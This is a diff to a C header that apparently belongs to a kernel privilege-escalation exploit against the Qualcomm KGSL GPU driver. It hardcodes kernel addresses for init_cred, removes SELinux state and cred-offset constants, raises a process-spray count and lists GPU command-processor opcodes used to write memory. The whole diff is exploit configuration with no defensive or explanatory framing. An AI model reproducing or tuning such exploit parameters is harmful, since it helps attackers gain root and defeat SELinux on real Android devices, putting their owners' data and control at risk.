@@ -19,7 +19,6 @@
 #include <linux/perf_event.h>
 #include <asm/unistd.h>
 #include <sys/wait.h>
-#include <signal.h>
 #include <sys/select.h>
 #include <poll.h>
 #include <sys/stat.h>
@@ -82,22 +81,15 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define PLACEHOLDER_ADDR 0x710204000ULL
 #define PLACEHOLDER_SIZE 0x10400000ULL
 
+#define OFFSET_INIT_CRED 0x2117d08ULL
 #define VMLINUX_TEXT      0xffffffc010080000ULL
 #define VMLINUX_INIT_CRED 0xffffffc012197d08ULL
-#define VMLINUX_SELINUX_STATE 0xffffffc0123a4000ULL
-#define VMLINUX_SELINUX_ENFORCING_BOOT 0xffffffc01240744cULL
 
-#define CRED_OFF    0x740
-#define REAL_CRED_OFF 0x738
-
-#define SPRAY_PIDS 2000
+#define SPRAY_PIDS 3000
 #define SCAN_DWORDS 560
 
 #define CP_NOP 0x10
 #define CP_MEM_WRITE 0x3D
 #define CP_MEM_TO_MEM 0x73
-#define CP_WAIT_MEM_WRITES 0x12
-#define CP_EVENT_WRITE 0x46
-#define CACHE_FLUSH_TS 0x1C
 
 #endif
